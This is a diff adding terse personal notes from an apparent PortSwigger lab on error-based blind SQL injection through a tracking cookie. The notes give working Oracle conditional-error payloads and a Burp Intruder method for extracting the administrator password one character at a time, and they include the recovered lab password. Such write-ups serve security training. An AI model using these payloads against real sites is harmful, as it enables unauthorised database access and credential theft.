@@ -1,0 +1,27 @@
+Description says its in the cookie 
+Using burp to intercept
+2 cookies 1 for session 1 for tracking ID
+No need to mess with the sessio
+Only use the session
+Send the intercepted packet to the repeater
+Using the SQL cheat sheet https://portswigger.net/web-security/sql-injection/cheat-sheet
+Just to check which version is being used I'll try MySQL first
+'SELECT IF(1=0,(SELECT table_name FROM information_schema.tables),'a') 
+Since its an error based I'm giving a false condition to see if an error pops up
+Gave an error
+Tried 1=1 also gave an error
+Trying oracle now
+'SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE NULL END FROM dual
+1=0 no error
+1=1 error
+its using oracle
+Now to check for the parameters to get admin password
+'UNION	SELECT CASE WHEN (SUBSTR(password,1,1)< 'a') THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' --
+>a gives an error now moving to intruder
+Set it to sniper and make the $a$ as the attack and payload numbers and lowercase and uppercase letters
+got an error at h
+do it with the next letter with password,2,1 and so on
+h29aah96srjkbk2t7ypi
+on 21 i got null as status 500 which was an error
+so the above was the password
+administrator as username and solved
